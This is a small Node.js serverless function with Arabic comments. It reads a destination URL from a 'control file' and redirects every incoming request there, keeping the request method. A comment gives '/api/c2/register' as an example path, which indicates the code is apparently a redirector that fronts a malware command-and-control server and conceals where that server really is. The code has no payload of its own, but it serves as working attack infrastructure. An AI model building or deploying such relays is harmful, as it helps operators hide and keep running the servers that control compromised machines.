const fs = require('fs');
const path = require('path');

exports.handler = async function(event, context) {
  try {
    // 1. تحديد المسار الصحيح للملف (الآن في نفس المجلد)
    const filePath = path.join(__dirname, 'server_url.txt'); 
    
    // 2. قراءة محتوى الملف وتنظيفه
    const targetUrl = fs.readFileSync(filePath, 'utf8').trim();

    // 3. التحقق من أن الملف ليس فارغاً
    if (!targetUrl) {
      throw new Error("ملف التحكم server_url.txt فارغ.");
    }

    // 4. بناء الرابط الكامل
    // event.path سيحتوي على المسار المطلوب مثل /api/c2/register
    const finalUrl = targetUrl + event.path;

    // 5. تنفيذ إعادة التوجيه
    return {
      statusCode: 307, // Temporary Redirect (يحافظ على نوع الطلب POST/GET)
      headers: {
        "Location": finalUrl,
      },
    };

  } catch (error) {
    // في حال وجود أي خطأ (مثل عدم العثور على الملف)
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        error: "فشل في قراءة ملف التحكم بالتوجيه.", 
        details: error.message 
      }),
    };
  }
};
